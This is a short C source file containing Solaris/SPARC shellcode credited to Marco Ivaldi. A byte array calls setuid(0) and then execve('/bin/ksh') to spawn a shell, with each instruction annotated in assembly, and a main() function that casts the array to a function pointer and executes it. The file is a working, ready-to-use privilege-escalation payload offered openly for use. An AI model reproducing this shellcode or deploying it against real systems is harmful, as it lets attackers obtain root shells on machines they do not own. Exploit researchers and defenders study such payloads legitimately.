/*
 * sparc_solaris_exec.c - Solaris/SPARC execve() shellcode
 * Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Pretty standard Solaris/SPARC setuid/execve shellcode.
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
 */

char sc[] = /* Solaris/SPARC execve() shellcode (12 + 48 = 60 bytes) */

/* setuid(0) */
"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
"\x82\x10\x20\x17"	/* mov  0x17, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/

/* execve("/bin/ksh", argv, NULL) */
"\x9f\x41\x40\x01"	/* rd   %pc,%o7 ! >= sparcv8+	*/
"\x90\x03\xe0\x28"	/* add  %o7, 0x28, %o0		*/
"\x92\x02\x20\x10"	/* add  %o0, 0x10, %o1		*/
"\xc0\x22\x20\x08"	/* clr  [ %o0 + 8 ]		*/
"\xd0\x22\x20\x10"	/* st   %o0, [ %o0 + 0x10 ]	*/
"\xc0\x22\x20\x14"	/* clr  [ %o0 + 0x14 ]		*/
"\x82\x10\x20\x0b"	/* mov  0xb, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/
"\x80\x1c\x40\x11"	/* xor  %l1, %l1, %g0 ! nop	*/
"\x41\x41\x41\x41"	/* placeholder			*/
"/bin/ksh";

void main()
{
	void (*f)() = (void *)sc;
	f();
}